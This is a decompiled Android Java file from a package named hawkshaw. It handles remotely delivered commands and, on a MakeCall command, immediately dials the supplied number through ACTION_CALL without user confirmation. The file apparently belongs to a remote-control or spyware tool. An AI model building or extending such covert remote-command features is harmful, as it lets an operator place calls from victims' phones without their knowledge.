package com.hawkshaw.library.features.telephony;

import Y1.K;
import android.content.Intent;
import android.net.Uri;
import com.hawkshaw.library.App;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;
import me.pushy.sdk.lib.paho.internal.ClientDefaults;

public final class HandlerKt {
    private static final String TAG = "TelephonyHandler";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        static {
            int[] iArr = new int[Command.CommandType.values().length];
            try {
                iArr[Command.CommandType.MakeCall.ordinal()] = 1;
            } catch (NoSuchFieldError unused) {
            }
            $EnumSwitchMapping$0 = iArr;
        }
    }

    public static final void handleTelephonyCommand(Command command) {
        K.n(command, "command");
        if (WhenMappings.$EnumSwitchMapping$0[command.getType().ordinal()] == 1) {
            makeCall(command.getMakeCallRequest());
        }
    }

    private static final void makeCall(Command.MakeCallRequest makeCallRequest) {
        if (makeCallRequest != null) {
            if (!ManifestPermissionsKt.hasPermission("android.permission.CALL_PHONE")) {
                Logger.e$default(Logger.INSTANCE, TAG, "MakeCall: You don't have call_phone permission", (Exception) null, false, 12, (Object) null);
                return;
            }
            Intent intent = new Intent("android.intent.action.CALL");
            String phoneNumber = makeCallRequest.getPhoneNumber();
            intent.setData(Uri.parse("tel:" + phoneNumber));
            intent.setFlags(ClientDefaults.MAX_MSG_SIZE);
            App.Companion.getContext().startActivity(intent);
        }
    }
}
